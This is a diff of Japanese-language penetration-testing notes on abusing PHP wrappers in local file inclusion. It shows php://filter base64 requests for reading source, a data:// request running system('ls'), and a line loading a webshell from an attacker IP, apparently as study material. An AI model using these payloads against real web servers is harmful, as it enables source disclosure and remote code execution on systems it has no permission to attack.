@@ -77,7 +77,7 @@ PHPのwrapperを使ってLFIを拡張できる。
 
 #### 手順
 
-1. HTTPリクエストでファイルを指定している箇所を見つける
+1. HTTPリクエストでファイルを指定している箇所を見つける（例）
 ```
 http://example.com/index.php?page=admin.php
 ```
@@ -94,18 +94,14 @@ GET /index.php?page=php://filter/resource=admin.php
 ```
 
 4. Base64エンコードして中身を取得する
-
 ```
 GET /index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ```
 
-5. 取得したBase64文字列をデコードする
-
+5. 取得したBase64文字列をデコードすると、中身がすべて表示される
 ```zsh
 echo "<base64_encoded_resource>" | base64 -d
 ```
-
----
 
 ### data://
 
@@ -113,15 +109,14 @@ echo "<base64_encoded_resource>" | base64 -d
 
 **攻撃シチュエーション：** WebアプリにPHPコードを直接書き込めない場合（WebShellが使えないときなど）に使う。
 
-> [!WARNING] PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。
+> [!WARNING] 
+> PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。
 
 #### 手順
 
 1. HTTPリクエストでファイルを指定している箇所を見つける
-    
+   
 2. Burp Suiteで `data://` を使って任意のコマンドを実行する
-    
-
 ```http
 GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
 ```
@@ -173,54 +168,6 @@ GET /index.php?page=http://<attacker_IP>/<webshell.php>&cmd=ls
 ---
 ---
 
-### PHP Wrappers
-
-- `php://filter`はファイルを実行せずに内容の表示が可能
-	- （単なる"パストラバーサル" or "LFIのファイル指定"だとファイルが実行される）
-- `data://`は任意コードを実行可能
-
-#### php://filter
-
-##### 概要
-
-- 用途：PHPファイルの内容を<u>実行せずに</u>表示できるため、コードの中身を丸ごと閲覧可能で、機密情報の取得やアプリのロジック解析に使える
-- シチュエーション：HTTPリクエストでファイルを指定しているとき
-- 仕組み：ファイルの中身がROT13やBase64のエンコード有無にかかわらず、実行可能ファイル(`php`, `py`等)を表示できる(⚠️`php`だけに限らない)
-
-##### php://filterによるデータ抽出手順
-
-1. HTTPリクエストでファイルを指定している箇所を見つける
-```zsh
-# 例
-http://example.com/index.php?page=admin.php
-```
-
-2. Burp Suiteでファイルを実行した結果を閲覧する。このとき、`<body>` などのタグが閉じられていないなど、不自然なコードがないかを探す。
-
-![](../../Images/Pasted%20image%2020250329113419.png)
-
-3. `php://filter` wrapperを使用してファイルの中身を表示する。もし、ステップ２と結果が変わらない場合は次のステップに進む
-```
-GET /index.php?page=php://filter/resource=admin.php
-```
-- resourceはこのwrapperに必要なパラメタ
-
-4. 指定したresourceの中身をすべてをbase64にエンコードする
-```
-GET /index.php?page=php://filter/convert.base64-encode/resource=admin.php
-```
-```html
-...
-<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
-PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
-dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
-...
-```
-
-5. ターミナル上で、Base64 で取得したデータを `base64 -d` でデコードすると、中身がすべて表示される
-```zsh
-echo "<basee64_encoded_resource>" | base64 -d
-```
 
 #### data://
 
